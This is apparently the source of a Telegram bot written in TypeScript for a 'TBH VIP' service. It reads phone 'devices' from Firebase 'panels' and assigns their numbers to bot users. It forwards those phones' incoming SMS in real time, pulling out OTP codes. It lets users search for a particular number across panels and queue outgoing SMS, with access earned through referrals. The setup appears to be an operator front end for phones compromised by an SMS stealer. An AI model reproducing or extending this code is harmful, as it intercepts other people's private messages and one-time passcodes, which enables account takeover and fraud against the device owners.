import TelegramBot from "node-telegram-bot-api";
import { db, botUsersTable, panelsTable, giftCardsTable, referralsTable } from "@workspace/db";
import { eq, and, sql } from "drizzle-orm";
import { fetchPanelDevices, fetchDeviceSms } from "./firebase";
import { logger } from "./logger";

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const BOT_USERNAME = process.env.BOT_USERNAME || "TBH_VIP_BOT";

// Required channels to join
const REQUIRED_CHANNELS = [
  { username: "@TBH_BRAND", label: "TBH OFFICAL" },
  { username: "@TBH_X_EARNING", label: "TBH_X_EARNING" },
  { username: "@TBH_OFFICAL_CHAT", label: "TBH OFFICAL CHAT" },
];

let bot: TelegramBot | null = null;

export function getBot(): TelegramBot | null {
  return bot;
}

export function initBot(useWebhook = false): TelegramBot {
  if (bot) return bot;

  if (!BOT_TOKEN) {
    logger.error("TELEGRAM_BOT_TOKEN not set");
    throw new Error("TELEGRAM_BOT_TOKEN is required");
  }

  if (useWebhook) {
    bot = new TelegramBot(BOT_TOKEN, { webHook: false });
  } else {
    bot = new TelegramBot(BOT_TOKEN, { polling: true });
    logger.info("Telegram bot started with polling");
    setupHandlers(bot);
  }

  return bot;
}

export function processUpdate(update: TelegramBot.Update): void {
  if (!bot) return;
  bot.processUpdate(update);
}

// ─── Keyboards ────────────────────────────────────────────────────────────────

function mainMenuKeyboard(): TelegramBot.ReplyKeyboardMarkup {
  return {
    keyboard: [
      [{ text: "⚡ GET NUMBER" }, { text: "🌐 WEB PANEL" }],
      [{ text: "📢 SEND SMS" }],
      [{ text: "🌐 STATUS" }, { text: "🔎 SEARCH NUMBER" }],
      [{ text: "📋 REFER & EARN" }, { text: "🎁 GIFT CARD" }],
      [{ text: "🔴 BACK" }],
    ],
    resize_keyboard: true,
  };
}

function numberMenuKeyboard(): TelegramBot.ReplyKeyboardMarkup {
  return {
    keyboard: [
      [{ text: "🆕 NEW NUMBER" }, { text: "🔥 WATCH SMS" }],
      [{ text: "🔗 SMS HISTORY" }, { text: "🛑 STOP WATCH" }],
      [{ text: "🔴 BACK" }],
    ],
    resize_keyboard: true,
  };
}

function watchMenuKeyboard(): TelegramBot.ReplyKeyboardMarkup {
  return {
    keyboard: [
      [{ text: "🛑 STOP WATCH" }, { text: "🔗 SMS HISTORY" }],
      [{ text: "🔴 BACK" }],
    ],
    resize_keyboard: true,
  };
}

function cancelKeyboard(): TelegramBot.ReplyKeyboardMarkup {
  return {
    keyboard: [[{ text: "🔴 CANCEL" }]],
    resize_keyboard: true,
  };
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

function generateReferralCode(telegramId: string): string {
  return `ref_${telegramId}`;
}

async function getOrCreateUser(msg: TelegramBot.Message, referredBy?: string | null) {
  const telegramId = String(msg.from!.id);
  const [existing] = await db
    .select()
    .from(botUsersTable)
    .where(eq(botUsersTable.telegramId, telegramId));

  if (existing) return existing;

  // New user — give 1hr free access
  const expiresAt = new Date(Date.now() + 60 * 60 * 1000);
  const [user] = await db
    .insert(botUsersTable)
    .values({
      telegramId,
      username: msg.from?.username || null,
      firstName: msg.from?.first_name || "User",
      referralCode: generateReferralCode(telegramId),
      referredBy: referredBy || null,
      getNumberExpiresAt: expiresAt,
    })
    .returning();

  // Handle referral reward
  if (referredBy) {
    const [referrer] = await db
      .select()
      .from(botUsersTable)
      .where(eq(botUsersTable.referralCode, referredBy));

    if (referrer) {
      const newCount = referrer.referralCount + 1;
      const now = new Date();

      // Calculate new Get Number expiry (+12hr)
      const currentExpiry = referrer.getNumberExpiresAt
        ? new Date(Math.max(referrer.getNumberExpiresAt.getTime(), now.getTime()))
        : now;
      const newExpiry = new Date(currentExpiry.getTime() + 12 * 60 * 60 * 1000);

      // Check if reaching 10 referrals — unlock Send SMS
      const sendSmsUnlocked = newCount >= 10 ? true : referrer.sendSmsUnlocked;
      const newSmsCredits = newCount >= 10 && !referrer.sendSmsUnlocked
        ? referrer.smsCredits + 500
        : newCount > 10
        ? referrer.smsCredits + 100
        : referrer.smsCredits;

      // Web panel unlock at 10 referrals (+24hr)
      let webPanelExpiry = referrer.webPanelExpiresAt;
      if (newCount === 10) {
        const webBase = webPanelExpiry ? new Date(Math.max(webPanelExpiry.getTime(), now.getTime())) : now;
        webPanelExpiry = new Date(webBase.getTime() + 24 * 60 * 60 * 1000);
      } else if (newCount > 10 && webPanelExpiry) {
        const webBase = new Date(Math.max(webPanelExpiry.getTime(), now.getTime()));
        webPanelExpiry = new Date(webBase.getTime() + 12 * 60 * 60 * 1000);
      }

      await db
        .update(botUsersTable)
        .set({
          referralCount: newCount,
          getNumberExpiresAt: newExpiry,
          sendSmsUnlocked,
          smsCredits: newSmsCredits,
          webPanelExpiresAt: webPanelExpiry,
        })
        .where(eq(botUsersTable.id, referrer.id));

      await db.insert(referralsTable).values({
        referrerId: referrer.id,
        referredTelegramId: telegramId,
      });
    }
  }

  return user;
}

async function hasGetNumberAccess(user: { getNumberExpiresAt: Date | null }): Promise<boolean> {
  if (!user.getNumberExpiresAt) return false;
  return user.getNumberExpiresAt > new Date();
}

async function getAllOnlineDevices() {
  const panels = await db.select().from(panelsTable);
  const allDevices = [];
  for (const panel of panels) {
    const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
    allDevices.push(...devices.filter((d) => d.status));
  }
  return allDevices;
}

async function getDeviceFromPanel(panelId: number, deviceId: string) {
  const [panel] = await db.select().from(panelsTable).where(eq(panelsTable.id, panelId));
  if (!panel) return null;
  const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
  return devices.find((d) => d.id === deviceId) || null;
}

// Watch polling interval map: userId → intervalId
const watchIntervals = new Map<string, NodeJS.Timeout>();
const watchLastSms = new Map<string, string>(); // userId → last SMS text

// ─── Bot Handlers ─────────────────────────────────────────────────────────────

function setupHandlers(bot: TelegramBot) {
  bot.on("message", async (msg) => {
    if (!msg.from || !msg.text) return;
    const chatId = msg.chat.id;
    const text = msg.text.trim();
    const telegramId = String(msg.from.id);

    try {
      // Handle /start with optional referral
      if (text.startsWith("/start")) {
        const parts = text.split(" ");
        const param = parts[1] || null;
        const referredBy = param?.startsWith("ref_") ? param : null;

        const user = await getOrCreateUser(msg, referredBy);

        await bot.sendMessage(
          chatId,
          `━━━━━━━━━━━━━━━━━━━\nWELCOME TO TBH 😊\n━━━━━━━━━━━━━━━━━━━\n🎁 AAPKO 1 GHANTE KE LIYE GET NUMBER FREE MILA!\nKOI LIMIT NAHI — 1HR TAK FULL ACCESS.\n\n⏰ 1HR KE BAAD GET NUMBER LOCK HO JAYEGA.\nREFFER BUTTON DABAO AUR APNA REFERRAL LINK SHARE KARO — HAR REFERRAL PE EXTRA HOURS MILEGA!`,
          { reply_markup: { remove_keyboard: true } }
        );

        // Show channel join buttons
        await bot.sendMessage(
          chatId,
          `🔒 JOIN REQUIRED\n\nTO USE THIS BOT YOU MUST JOIN ALL OF THESE CHANNELS FIRST:`,
          {
            reply_markup: {
              inline_keyboard: [
                ...REQUIRED_CHANNELS.map((ch) => [
                  { text: `Join ${ch.label}`, url: `https://t.me/${ch.username.replace("@", "")}` },
                ]),
                [{ text: "✅ I Joined — Check Again", callback_data: "check_joined" }],
              ],
            },
          }
        );
        return;
      }

      // Check if user exists
      const [user] = await db
        .select()
        .from(botUsersTable)
        .where(eq(botUsersTable.telegramId, telegramId));

      if (!user) {
        await bot.sendMessage(chatId, "Please send /start to begin.");
        return;
      }

      // ─── Main menu buttons ───────────────────────────────────────────────

      if (text === "⚡ GET NUMBER" || text === "🆕 NEW NUMBER") {
        const hasAccess = await hasGetNumberAccess(user);
        if (!hasAccess) {
          await bot.sendMessage(
            chatId,
            `⏰ GET NUMBER ACCESS EXPIRED!\n\nAccess khatam ho gaya. Extend karne ke liye referrals karo:\n• Har referral = +12hr access\n\nREFER & EARN button dabao aur apna link share karo.`,
            { reply_markup: mainMenuKeyboard() }
          );
          return;
        }

        await bot.sendMessage(chatId, "⚡ Number ready! Fetching from panels — please wait...");

        const onlineDevices = await getAllOnlineDevices();
        if (onlineDevices.length === 0) {
          await bot.sendMessage(
            chatId,
            "📵 No online numbers available right now. Please try again later.",
            { reply_markup: mainMenuKeyboard() }
          );
          return;
        }

        // Pick random device
        const device = onlineDevices[Math.floor(Math.random() * onlineDevices.length)];

        // Assign device to user
        await db
          .update(botUsersTable)
          .set({ assignedDeviceId: device.id, assignedPanelId: device.panelId, state: "number_menu" })
          .where(eq(botUsersTable.id, user.id));

        const remainingMs = user.getNumberExpiresAt
          ? Math.max(0, user.getNumberExpiresAt.getTime() - Date.now())
          : 0;
        const remainingMin = Math.floor(remainingMs / 60000);

        await bot.sendMessage(
          chatId,
          `📱 Your Number\n\n🔵 SIM 1 : ${device.phoneNumber}\n🟢 SIM 2 : ${device.phoneNumber}\n\n📱 Model   : ${device.model}\n🔋 Battery : ${device.battery}\n📅 Last SMS : ${device.lastSeen || "N/A"}\n📨 Total SMS : ${device.totalSms}\n\n✅ Ready to receive OTPs\n\n⏰ Active — ${remainingMin}m remaining`,
          { reply_markup: numberMenuKeyboard() }
        );
        return;
      }

      if (text === "🔥 WATCH SMS") {
        if (!user.assignedDeviceId || !user.assignedPanelId) {
          await bot.sendMessage(chatId, "First get a number using GET NUMBER.", { reply_markup: mainMenuKeyboard() });
          return;
        }

        const [panel] = await db.select().from(panelsTable).where(eq(panelsTable.id, user.assignedPanelId));
        if (!panel) {
          await bot.sendMessage(chatId, "Panel not found.", { reply_markup: mainMenuKeyboard() });
          return;
        }

        // Clear existing watch
        const existingInterval = watchIntervals.get(telegramId);
        if (existingInterval) clearInterval(existingInterval);

        await bot.sendMessage(
          chatId,
          `👁 WATCHING FOR OTPS...\n\n📱 NUMBER: ${user.assignedDeviceId}\n\nNEW OTP/SMS WILL ARRIVE HERE IN REAL-TIME.\nSPAM / RECHARGE / TRANSACTION SMS ARE AUTO-BLOCKED.\n\nTAP STOP WATCH TO STOP.`,
          { reply_markup: watchMenuKeyboard() }
        );

        // Start polling every 10s
        const intervalId = setInterval(async () => {
          try {
            const smsMessages = await fetchDeviceSms(panel.firebaseUrl, panel.secretKey, user.assignedDeviceId!);
            if (smsMessages.length === 0) return;

            const latest = smsMessages[0];
            const key = `${latest.sender}:${latest.text}:${latest.time}`;
            const lastKey = watchLastSms.get(telegramId);

            if (key !== lastKey) {
              watchLastSms.set(telegramId, key);
              // Check if it looks like an OTP
              const otpMatch = latest.text.match(/\b\d{4,8}\b/);
              const otp = otpMatch ? `\n\n🔑 OTP: ${otpMatch[0]}` : "";
              await bot.sendMessage(
                chatId,
                `📩 NEW SMS RECEIVED!\n\nFrom: ${latest.sender}\nTime: ${latest.time}\n\n${latest.text}${otp}`,
                { reply_markup: watchMenuKeyboard() }
              );
            }
          } catch (err) {
            logger.error({ err }, "Watch SMS polling error");
          }
        }, 10000);

        watchIntervals.set(telegramId, intervalId);
        await db.update(botUsersTable).set({ state: "watching" }).where(eq(botUsersTable.id, user.id));
        return;
      }

      if (text === "🛑 STOP WATCH") {
        const intervalId = watchIntervals.get(telegramId);
        if (intervalId) {
          clearInterval(intervalId);
          watchIntervals.delete(telegramId);
          watchLastSms.delete(telegramId);
        }
        await db.update(botUsersTable).set({ state: "number_menu" }).where(eq(botUsersTable.id, user.id));
        await bot.sendMessage(chatId, "⏹ Watch stopped.", { reply_markup: numberMenuKeyboard() });
        return;
      }

      if (text === "🔗 SMS HISTORY") {
        if (!user.assignedDeviceId || !user.assignedPanelId) {
          await bot.sendMessage(chatId, "First get a number using GET NUMBER.", { reply_markup: mainMenuKeyboard() });
          return;
        }

        const [panel] = await db.select().from(panelsTable).where(eq(panelsTable.id, user.assignedPanelId));
        if (!panel) {
          await bot.sendMessage(chatId, "Panel not found.", { reply_markup: numberMenuKeyboard() });
          return;
        }

        const messages = await fetchDeviceSms(panel.firebaseUrl, panel.secretKey, user.assignedDeviceId);
        if (messages.length === 0) {
          await bot.sendMessage(chatId, "📭 No SMS history found.", { reply_markup: numberMenuKeyboard() });
          return;
        }

        const recent = messages.slice(0, 10);
        const formatted = recent
          .map((m, i) => `${i + 1}. From: ${m.sender}\n   Time: ${m.time}\n   ${m.text.slice(0, 100)}`)
          .join("\n\n");

        await bot.sendMessage(
          chatId,
          `📋 SMS History (${messages.length} msgs)\n\n${formatted}`,
          { reply_markup: numberMenuKeyboard() }
        );
        return;
      }

      if (text === "🌐 STATUS") {
        const panels = await db.select().from(panelsTable);
        let totalOnline = 0;
        let totalOffline = 0;
        let totalDevices = 0;

        for (const panel of panels) {
          const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
          const online = devices.filter((d) => d.status).length;
          const offline = devices.length - online;
          totalOnline += online;
          totalOffline += offline;
          totalDevices += devices.length;
        }

        await bot.sendMessage(
          chatId,
          `📊 STATUS REPORT\n\n📱 All Panels — Total\n🟢 Online   : ${totalOnline}\n🔴 Offline  : ${totalOffline}\n📱 Grand Total : ${totalDevices}\n\n🔄 Auto-refresh: every 1hr`,
          { reply_markup: mainMenuKeyboard() }
        );
        return;
      }

      if (text === "🔎 SEARCH NUMBER") {
        const panels = await db.select().from(panelsTable);
        const totalOnline = [];
        for (const panel of panels) {
          const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
          totalOnline.push(...devices.filter((d) => d.status));
        }

        await db.update(botUsersTable).set({ state: "search_number" }).where(eq(botUsersTable.id, user.id));

        await bot.sendMessage(
          chatId,
          `🔎 SEARCH NUMBER\n\n🌐 ALL PANELS CONNECTED. CURRENTLY ${totalOnline.length} ONLINE NUMBERS LOADED.\n\nENTER THE PHONE NUMBER YOU WANT TO SEARCH:\n(Jiska number dhoondna hai)\n\nExample: 9876543210\n\nTAP BACK TO CANCEL.`,
          { reply_markup: cancelKeyboard() }
        );
        return;
      }

      if (text === "📋 REFER & EARN") {
        const expiryStr = user.getNumberExpiresAt
          ? `✅ ACTIVE — ${Math.max(0, Math.floor((user.getNumberExpiresAt.getTime() - Date.now()) / 60000))}m remaining`
          : "❌ EXPIRED";

        const webStatus = user.webPanelExpiresAt && user.webPanelExpiresAt > new Date()
          ? `✅ ACTIVE — ${Math.floor((user.webPanelExpiresAt.getTime() - Date.now()) / 3600000)}hr remaining`
          : `🔒 LOCKED — ${10 - Math.min(user.referralCount, 10)} aur referrals karo (${user.referralCount}/10) to unlock + 24HR access`;

        const sendStatus = user.sendSmsUnlocked
          ? `✅ UNLOCKED — ${user.smsCredits} credits`
          : `🔒 LOCKED — ${10 - Math.min(user.referralCount, 10)} aur referrals karo (${user.referralCount}/10) to unlock + 500 credits`;

        const referralLink = `https://t.me/${BOT_USERNAME}?start=${user.referralCode}`;

        await bot.sendMessage(
          chatId,
          `🎁 REFERRAL SYSTEM\n\nAAPKA REFERRAL LINK:\n${referralLink}\n\nLink pe tap karke copy karo, ya Share button use karo.\n\n━━ AAPKE REFERRALS ━━\n👥 TOTAL REFERRALS: ${user.referralCount}\n\n━━ GET NUMBER ━━\n${expiryStr}\n\n━━ SEND SMS ━━\n${sendStatus}\n\n━━ WEB PANEL ━━\n${webStatus}\n\nLink doston ke saath share karo — har naya user jo isi link se join karega, uspe aapko EXTRA HOURS milega!\n\nRULES:\n• 1st referral = +12hr Get Number access\n• Har extra referral = +12hr (cumulative)\n• 10 referrals = Send SMS unlock + 500 SMS credits\n• Uske baad har referral = +100 SMS credits\n• 10 referrals = Web Panel unlock + 24HR access\n• Uske baad har referral = +12hr web access`,
          { reply_markup: mainMenuKeyboard() }
        );
        return;
      }

      if (text === "🎁 GIFT CARD") {
        await db.update(botUsersTable).set({ state: "gift_card" }).where(eq(botUsersTable.id, user.id));
        await bot.sendMessage(
          chatId,
          `🎁 GIFT CARD REDEEM\n\nApna gift code send karein (E.G. GIFT-AB3X7K):\n\nValid code redeem karne pe aapko Get Number access milega.`,
          { reply_markup: cancelKeyboard() }
        );
        return;
      }

      if (text === "🌐 WEB PANEL") {
        if (user.referralCount < 10) {
          await bot.sendMessage(
            chatId,
            `🌐 WEB PANEL — LOCKED!\n\nWeb unlock karne ke liye ${10 - user.referralCount} REFERRALS AUR KARO!\n🔒 10 referrals complete karo to 24hr ke liye web unlock hoga.\n\n👥 AAPKE TOTAL REFERRALS: ${user.referralCount}\n✋ Refer button dabao aur apna link share karo.`,
            { reply_markup: mainMenuKeyboard() }
          );
          return;
        }

        const hasWebAccess = user.webPanelExpiresAt && user.webPanelExpiresAt > new Date();
        if (!hasWebAccess) {
          await bot.sendMessage(
            chatId,
            `🌐 WEB PANEL — ACCESS EXPIRED!\n\nWeb panel access khatam ho gaya. Refer karo to extend karo.`,
            { reply_markup: mainMenuKeyboard() }
          );
          return;
        }

        const webUrl = process.env.REPLIT_DEV_DOMAIN
          ? `https://${process.env.REPLIT_DEV_DOMAIN}`
          : "https://your-domain.repl.co";

        await bot.sendMessage(
          chatId,
          `🌐 WEB PANEL ACCESS GRANTED!\n\nClick here to open:\n${webUrl}\n\nAccess expires: ${user.webPanelExpiresAt?.toLocaleString("en-IN")}`,
          { reply_markup: mainMenuKeyboard() }
        );
        return;
      }

      if (text === "📢 SEND SMS") {
        if (!user.sendSmsUnlocked) {
          await bot.sendMessage(
            chatId,
            `🔒 SEND SMS LOCKED\n\nSMS bhejne ke liye 10 referrals complete karo.\nYahan tak: ${user.referralCount}/10\nAur ${10 - Math.min(user.referralCount, 10)} referrals karo to unlock + 500 SMS CREDITS milenge.\n\n✋ Refer & Earn button se apna link share karo.`,
            { reply_markup: mainMenuKeyboard() }
          );
          return;
        }

        if (user.smsCredits <= 0) {
          await bot.sendMessage(
            chatId,
            `📢 SEND SMS\n\nAapke paas 0 SMS credits hain.\nReferrals karo to credits earn karo (har referral = +100 credits).`,
            { reply_markup: mainMenuKeyboard() }
          );
          return;
        }

        await bot.sendMessage(
          chatId,
          `📢 SEND SMS\n\nAapke paas ${user.smsCredits} SMS credits hain.\n\nFormat: NUMBER|MESSAGE\nExample: 9876543210|Hello, this is a test message\n\nCancel karne ke liye CANCEL dabao.`,
          { reply_markup: cancelKeyboard() }
        );
        await db.update(botUsersTable).set({ state: "send_sms" }).where(eq(botUsersTable.id, user.id));
        return;
      }

      if (text === "🔴 BACK" || text === "🔴 CANCEL") {
        // Stop any watch
        const intervalId = watchIntervals.get(telegramId);
        if (intervalId) {
          clearInterval(intervalId);
          watchIntervals.delete(telegramId);
          watchLastSms.delete(telegramId);
        }
        await db.update(botUsersTable).set({ state: "main_menu" }).where(eq(botUsersTable.id, user.id));
        await bot.sendMessage(
          chatId,
          `🏠 MAIN MENU\n\nTap a button below 👇`,
          { reply_markup: mainMenuKeyboard() }
        );
        return;
      }

      // ─── State-based inputs ───────────────────────────────────────────────

      if (user.state === "search_number") {
        if (text === "🔴 CANCEL") {
          await db.update(botUsersTable).set({ state: "main_menu" }).where(eq(botUsersTable.id, user.id));
          await bot.sendMessage(chatId, "🏠 MAIN MENU", { reply_markup: mainMenuKeyboard() });
          return;
        }

        const searchNum = text.replace(/\D/g, "");
        if (searchNum.length < 7) {
          await bot.sendMessage(chatId, "Please enter a valid phone number (at least 7 digits).");
          return;
        }

        await bot.sendMessage(chatId, "🔎 Searching across all panels...");

        const panels = await db.select().from(panelsTable);
        let found = null;
        for (const panel of panels) {
          const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
          const match = devices.find((d) => d.phoneNumber.replace(/\D/g, "").includes(searchNum));
          if (match) {
            found = match;
            break;
          }
        }

        if (found) {
          await bot.sendMessage(
            chatId,
            `✅ NUMBER FOUND!\n\n📱 Phone: ${found.phoneNumber}\n📊 Panel: ${found.panelName}\n🔋 Battery: ${found.battery}\n🟢 Status: ${found.status ? "Online" : "Offline"}\n📅 Last Seen: ${found.lastSeen || "N/A"}`,
            { reply_markup: mainMenuKeyboard() }
          );
        } else {
          await bot.sendMessage(chatId, `❌ Number ${text} not found in any panel.`, { reply_markup: mainMenuKeyboard() });
        }

        await db.update(botUsersTable).set({ state: "main_menu" }).where(eq(botUsersTable.id, user.id));
        return;
      }

      if (user.state === "gift_card") {
        const code = text.toUpperCase().trim();

        const [card] = await db
          .select()
          .from(giftCardsTable)
          .where(and(eq(giftCardsTable.code, code)));

        if (!card) {
          await bot.sendMessage(chatId, "❌ Invalid gift code. Please try again.");
          return;
        }

        if (card.usedBy) {
          await bot.sendMessage(chatId, "❌ This gift code has already been used.");
          return;
        }

        // Redeem the card
        const value = parseInt(card.value, 10);
        let updateData: Partial<{ getNumberExpiresAt: Date; smsCredits: number }> = {};

        if (card.type === "hours") {
          const now = new Date();
          const currentExpiry = user.getNumberExpiresAt
            ? new Date(Math.max(user.getNumberExpiresAt.getTime(), now.getTime()))
            : now;
          updateData.getNumberExpiresAt = new Date(currentExpiry.getTime() + value * 60 * 60 * 1000);
        } else if (card.type === "credits") {
          updateData.smsCredits = user.smsCredits + value;
        }

        await db
          .update(botUsersTable)
          .set(updateData)
          .where(eq(botUsersTable.id, user.id));

        await db
          .update(giftCardsTable)
          .set({ usedBy: telegramId, usedAt: new Date() })
          .where(eq(giftCardsTable.id, card.id));

        const rewardMsg = card.type === "hours"
          ? `+${value} hours Get Number access`
          : `+${value} SMS credits`;

        await bot.sendMessage(
          chatId,
          `✅ Gift code redeemed successfully!\n\nReward: ${rewardMsg}`,
          { reply_markup: mainMenuKeyboard() }
        );
        await db.update(botUsersTable).set({ state: "main_menu" }).where(eq(botUsersTable.id, user.id));
        return;
      }

      if (user.state === "send_sms") {
        if (text.includes("|")) {
          const [num, ...msgParts] = text.split("|");
          const phoneNum = num.trim().replace(/\D/g, "");
          const message = msgParts.join("|").trim();

          if (!phoneNum || !message) {
            await bot.sendMessage(chatId, "Invalid format. Use: NUMBER|MESSAGE");
            return;
          }

          // Deduct 1 credit
          await db
            .update(botUsersTable)
            .set({ smsCredits: Math.max(0, user.smsCredits - 1), state: "main_menu" })
            .where(eq(botUsersTable.id, user.id));

          await bot.sendMessage(
            chatId,
            `✅ SMS queued!\n\nTo: ${phoneNum}\nMessage: ${message}\n\nCredits remaining: ${user.smsCredits - 1}`,
            { reply_markup: mainMenuKeyboard() }
          );
          return;
        }
      }

      // Default: show main menu
      await bot.sendMessage(chatId, "🏠 MAIN MENU\n\nTap a button below 👇", { reply_markup: mainMenuKeyboard() });
    } catch (err) {
      logger.error({ err, chatId }, "Bot message handler error");
      try {
        await bot.sendMessage(chatId, "Something went wrong. Please try again.");
      } catch {}
    }
  });

  // Callback query handler (inline keyboard)
  bot.on("callback_query", async (query) => {
    if (!query.message || !query.from) return;
    const chatId = query.message.chat.id;
    const telegramId = String(query.from.id);
    const data = query.data;

    try {
      if (data === "check_joined") {
        const [user] = await db
          .select()
          .from(botUsersTable)
          .where(eq(botUsersTable.telegramId, telegramId));

        if (!user) {
          // Create user without referral
          const expiresAt = new Date(Date.now() + 60 * 60 * 1000);
          await db.insert(botUsersTable).values({
            telegramId,
            username: query.from.username || null,
            firstName: query.from.first_name || "User",
            referralCode: generateReferralCode(telegramId),
            referredBy: null,
            getNumberExpiresAt: expiresAt,
          });
        }

        await bot.answerCallbackQuery(query.id, { text: "Verified! Welcome to TBH VIP." });
        await bot.sendMessage(
          chatId,
          `✅ VERIFIED! YOU JOINED ALL CHANNELS.\n\n🏠 MAIN MENU\n\nTap a button below 👇`,
          { reply_markup: mainMenuKeyboard() }
        );
      }
    } catch (err) {
      logger.error({ err }, "Callback query error");
    }
  });

  logger.info("Bot handlers set up");
}
